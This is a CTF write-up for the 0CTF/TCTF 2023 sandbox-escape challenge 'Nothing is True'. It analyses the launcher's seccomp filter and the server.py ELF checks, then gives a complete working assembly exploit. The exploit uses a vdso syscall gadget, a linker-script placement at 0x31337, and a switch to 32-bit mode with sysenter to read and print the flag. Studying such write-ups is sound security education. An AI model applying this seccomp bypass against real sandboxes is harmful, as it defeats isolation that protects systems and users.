## Nothing is True

was a pwn challenge, from 0CTF/TCTF 2023.

It was a kind of sandbox escape challenge, a tricky one.

------

### 1 - The Challenge

The challenge authors provided a `Dockerfile` to build the challenge.

He provided also a binary named `launcher`that is used inside the docker to launch an user given elf executable file.

He provided also a python script named `server.py`that ask the user to calculate a `pow`,  then it will ask to send a elf executable file that is written in local `./data/` directory with a hash filename, then it does various checks on the elf file , and if the elf file passes all the tests, the elf file will be executed via the docker by the script.

let's have a look at the `launcher`binary. First the `main` function:

```c
main(int argc, char **argv, char **envp)
{
  if ( argc <= 1 )
    return 0xFFFFFFFFLL;
  execute_file_1310(argv[1]);
  return 1LL;
}
```

it checks if there is a filename argument, and pass it to the other function, `execute_file_1310(char *path)`

```c
void execute_file_1310(char *path)
{
char *v2;

    if ( chroot("/chroot") < 0
    || chdir("/") < 0
    || setresgid(10000u, 10000u, 10000u) < 0
    || setresuid(10000u, 10000u, 10000u) < 0
    || (seccomp_setup_1250(path), v2 = 0LL, execve(path, &v2, 0LL) < 0) )// seccomp & execve
  {
    _exit(-2);
  }
}
```

This function chroot to `/chroot` directory, then set the seccomp before executing the file via `execve()`.

let's examine the `seccomp_setup_1250(path)`function:

```c
uint64_t __fastcall seccomp_setup_1250(char *path)
{
  __int16 seccomp_length;
  int *rules_ptr;
  int rules[80];
  char v5;

  qmemcpy(rules, static_seccomp_2008, sizeof(rules));
  rules[39] = (int)path;                        // copy lower 32bits of path address
  v5 = static_seccomp_2008[320];
  seccomp_length = 40;                          // seccomp length
  rules[35] = HIDWORD(path);                    // copy high 32bits of path address
  rules_ptr = rules;                            // point to rules
  if ( prctl(38, 1LL, 0LL, 0LL, 0LL) || prctl(22, 2LL, &seccomp_length) )
    _exit(-1);
}
```

This function copy static seccomp rules to an array `rules[80]`, then it modify one of the rules to check the `path`address on stack, and setup the resulting seccomp.

Here is the resulting seccomp rules:

```sh
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x1b 0xc000003e  if (A != ARCH_X86_64) goto 0029
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x22 0xffffffff  if (A != 0xffffffff) goto 0039
 0005: 0x15 0x20 0x00 0x00000003  if (A == close) goto 0038
 0006: 0x15 0x1f 0x00 0x0000000b  if (A == munmap) goto 0038
 0007: 0x15 0x1e 0x00 0x0000000c  if (A == brk) goto 0038
 0008: 0x15 0x1d 0x00 0x0000003c  if (A == exit) goto 0038
 0009: 0x15 0x1c 0x00 0x000000e7  if (A == exit_group) goto 0038
 0010: 0x15 0x00 0x04 0x00000009  if (A != mmap) goto 0015
 0011: 0x20 0x00 0x00 0x00000024  A = prot >> 32 # mmap(addr, len, prot, flags, fd, pgoff)
 0012: 0x15 0x00 0x1a 0x00000000  if (A != 0x0) goto 0039
 0013: 0x20 0x00 0x00 0x00000020  A = prot # mmap(addr, len, prot, flags, fd, pgoff)
 0014: 0x15 0x17 0x18 0x00000002  if (A == 0x2) goto 0038 else goto 0039
 0015: 0x15 0x00 0x04 0x0000003b  if (A != execve) goto 0020
 0016: 0x20 0x00 0x00 0x00000014  A = filename >> 32 # execve(filename, argv, envp)
 0017: 0x15 0x00 0x15 0x00007ffe  if (A != 0x7ffe) goto 0039
 0018: 0x20 0x00 0x00 0x00000010  A = filename # execve(filename, argv, envp)
 0019: 0x15 0x12 0x13 0xa12f7d0e  if (A == 0xa12f7d0e) goto 0038 else goto 0039
 0020: 0x15 0x00 0x12 0x00000002  if (A != open) goto 0039
 0021: 0x20 0x00 0x00 0x00000014  A = filename >> 32 # open(filename, flags, mode)
 0022: 0x15 0x00 0x10 0x00000000  if (A != 0x0) goto 0039
 0023: 0x20 0x00 0x00 0x00000010  A = filename # open(filename, flags, mode)
 0024: 0x15 0x00 0x0e 0x00031337  if (A != 0x31337) goto 0039
 0025: 0x20 0x00 0x00 0x0000001c  A = flags >> 32 # open(filename, flags, mode)
 0026: 0x15 0x00 0x0c 0x00000000  if (A != 0x0) goto 0039
 0027: 0x20 0x00 0x00 0x00000018  A = flags # open(filename, flags, mode)
 0028: 0x15 0x09 0x0a 0x00000000  if (A == 0x0) goto 0038 else goto 0039
 0029: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0039
 0030: 0x20 0x00 0x00 0x00000000  A = sys_number
 0031: 0x15 0x06 0x00 0x00000001  if (A == i386.exit) goto 0038
 0032: 0x15 0x05 0x00 0x00000003  if (A == i386.read) goto 0038
 0033: 0x15 0x04 0x00 0x00000004  if (A == i386.write) goto 0038
 0034: 0x15 0x03 0x00 0x0000002d  if (A == i386.brk) goto 0038
 0035: 0x15 0x02 0x00 0x0000005a  if (A == i386.mmap) goto 0038
 0036: 0x15 0x01 0x00 0x0000005b  if (A == i386.munmap) goto 0038
 0037: 0x15 0x00 0x01 0x000000fc  if (A != i386.exit_group) goto 0039
 0038: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0039: 0x06 0x00 0x00 0x00000000  return KILL
```

We can see that it is separated in two parts , one part for 64 bits syscalls when the processor is in 64bit mode, and one part for 32 bits int 0x80 interrupts when the processor run in 32 bits mode.

In **64 bits mode**:  `close`, `munmap`, `brk`, `exit`, `exit_group`, `mmap`, `open`and `execve`are authorized. 

There are some limitations for `mmap`, `execve`and `open`:

+ for `mmap`we can only map in write-only mode (prot == 2)
+ for `execve`, the first argument `pathname`should point on hash filename on stack (it changes at each run with ASLR). Its address is set in `seccomp_setup_1250(char *path)`function in loader.
+ for `open`, the first argument `pathname`address must be `0x31337`, and `flags`must be equal 0 (which is O_RDONLY)

In **32 bits mode**: `exit`, `read`, `write`, `brk`, `mmap`,`munmap`and `exit_group`syscalls are allowed.

There are no restrictions on 32 bits syscalls arguments, but they can only operate on 32 bits addresses , so in low 4GB memory zone.

------

### 2 - The `server.py` python script

The `server.py` python does many checks to verify the elf file before executing it, here are the checks:

```python
def check_segments(elf):
    for seg in elf.iter_segments():
        if seg.header.p_filesz > 0x10000 or seg.header.p_memsz > 0x10000:
            print('Segment too large')
            return False
        elif seg.header.p_type == 'PT_INTERP' or seg.header.p_type == 'PT_DYNAMIC':
            print('No dynamic link')
            return False
        elif seg.header.p_type == 'PT_LOAD' and seg.header.p_flags & P_FLAGS.PF_W and seg.header.p_flags & P_FLAGS.PF_X:
            print('W^X')
            return False
        elif seg.header.p_type == 'PT_GNU_STACK' and seg.header.p_flags & P_FLAGS.PF_X:
            print('No executable stack')
            return False

    return True

def check_elf(data):
    if len(data) < 0x40:
        print('Incomplete ELF Header')
        return False

    if not data.startswith(b'\x7fELF\x02\x01\x01' + b'\x00'*9):
        print('Invalid ELF Magic')
        return False

    if b'\xcd\x80' in data or b'\x0f\x05' in data:
        print('Bad Instruction')
        return False

    if not check_bytes(data, b'\xcd') or not check_bytes(data, b'\x80') or not check_bytes(data, b'\x0f') or not check_bytes(data, b'\x05'):
        print('Bad Instruction')
        return False

    elf = ELFFile(BytesIO(data))
    if ((elf.header.e_type != 'ET_EXEC' and elf.header.e_type != 'ET_DYN')
        or elf.header.e_version != 'EV_CURRENT'
        or elf.header.e_ehsize != 0x40
        or elf.header.e_phoff != 0x40
        or elf.header.e_phnum <= 0
        or elf.header.e_phnum >= 100):
        print('Bad ELF Header')
        return False
```

So the elf executable file:

+  must be a 64 bits elf file
+ it should not contains any `syscall` or `int 0x80` instructions
+ it must not be a dynamic executable file
+ stack must not be executable too
+ any segment should not be writable and executable at the same time
+ There is a limit on segment size too
+ And it verify too elf header validity..

------

### 3 - Bypassing all limitations

First we need to be able to do syscalls, for that we will reuse `vdso`address that is stored on stack,

and we will use a `syscall ; ret` instruction sequence that is inside vdso.

In the challenge description they give us the version of the running kernel on the remote machine

> CPU: Intel Xeon
>
> OS: Ubuntu 22.04.3 LTS
>
> uname -a: Linux VM-0-17-ubuntu 5.15.0-89-generic #99-Ubuntu SMP Mon Oct 30 20:42:41 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

So knowing the kernel, we can dump the vdso for this kernel, and find easily an usable syscall at offset 0xc7b.

To bypass the restriction on `open`sycall that must have it's `pathname`at address 0x31337, we will use a linker script for linking our exploit , that we wrote in assembly, and we will set the start of the `.bss` segment address at 0x31000.

Like this we can write the value we want at this address, and open the file we need.

We will open two files, first the we will open the binary hash filename. We can find it's name on the stack in argv[0],  it will be filedescriptor 3

Then we will open the flag file , it will be the filedescriptor 4

Then we will switch the processor in 32bit mode, for being able to call 32bits syscalls..

The problem is that we don"t have `int 0x80`instruction in vdso, so we will use the `sysenter`instruction that is doing a 32 bits syscall , like `int 0x80`

The only problem with `sysenter`instruction, it's that it will return in `vdso`, at the address stored in one `MSR`register.

That will be a 32 bits address, but it is not mapped because the elf file was a 64bit executable, and his vdso is mapped in high memory above the 4GB limit.

So the trick we used, was to `mmap` our executable file at the low 32bit value of vdso, that we can calculate from the `vdso`stored in stack. And call mmap syscall with the function `sysenter`

The function will `mmap`our executable at the place where the 32 bits `vdso`should be, and will return in it thinking that it is `vdso`.

Then once our fake `vdso`is mapped, we can use `sysenter` freely as `int 0x80`replacement, and call `read`on the filedescriptor 4 of the flag, and  `write`the flag content to `stdout`.

Then at the end we will execute `exit`syscall with the return value of  `137` , that the `server.py`script expect, and it will dump the flag.

------

### 4 - The exploit

```assembly
[bits 64]

global start
section .text exec
start: 
; find vdso
loop1:  pop rax
        cmp rax,0x21
        jne loop1
        pop rsi
	; hardcode syscall/ret offset in vdso
	lea rbx,[rsi+0xc7b]	; store vdso syscall address in rbx

; copy hash name to address 0x31337
	mov edi,0x31337
	mov rsi,[rsp+0x118]
	cld
cpy1:	lodsb
	stosb
	test al,al
	jne cpy1

; open hash file --> fd = 3
	mov edi,0x31337
	xor rsi,rsi
	mov eax,2
	call rbx

; copy 'flag' to address 0x31337
        mov edi,0x31337
        lea rsi,[fname1]
	lodsq
	mov [rdi],rax

; open flag --> fd = 4
        xor rsi,rsi
        mov eax,2
        call rbx

	; keep low part of vdso
	sub ebx,0x1000
	and ebx,~0xfff

; switch to 32bit
        lea     rsp, [sspace]
        lea     rcx,[next2]
	mov	eax,ss
	push	rax		; ss
	push	rsp		; rsp
	push    0x0202		; eflags
        push    0x23		; cs
        push    rcx		; rip
        iretq

fname1:	db "flag",0

[bits 32]
next2:
; try to map hashfile to vdso low memory
        mov eax, 0x5a
        push 0 ; offset
        push 3 ; fd
        push 0x11 ; flags
        push 5 ; prot
        push 0x3000 ; len
        push ebx
        mov ebx, esp
        call do_sysenter
; read
        mov eax, 3
        mov ebx, 4
        mov ecx, 0x31337
        mov edx, 128
        call do_sysenter
; write
	mov edx,eax
        mov eax, 4
        mov ebx, 1
        mov ecx, 0x31337
        call do_sysenter
; exit (and return 137)
        mov eax, 1
        mov ebx, 137
        call do_sysenter

do_sysenter:
        mov ebp, esp
        sysenter
; nopsled (god knows where sysenter will return)
        times 4096 db 0xc3

	section .bss noexec
        resq 4096
sspace:
```

and the linker script named `linker.ld` that we will use to have  `.bss` segment mapped at 0x31000

```sh
SECTIONS

{

. = 0x2f000;

.text : { *(.text) }

. = 0x31000;

.data : { *(.data) }

.bss : { *(.bss) }

}
```

and here is the command to assemble the exploit:

```
nasm -f elf64 exp.asm -o exp.o ; ld -e start exp.o -o exp -T linker.ld
```

exploit ouput:

```sh
Received: 9112 bytes
File Hash: 0379bdf0a6c78bf8b3816d31be1a4e9b3219588875642e98cf116653eace0b96
Return status: 137
Output:
flag{tak3_A_Leap_0f_Fa1th_mak3_s0ft_land1ng}
Bye!
```

and that's all !

*nobodyisnobody still pwning things..*
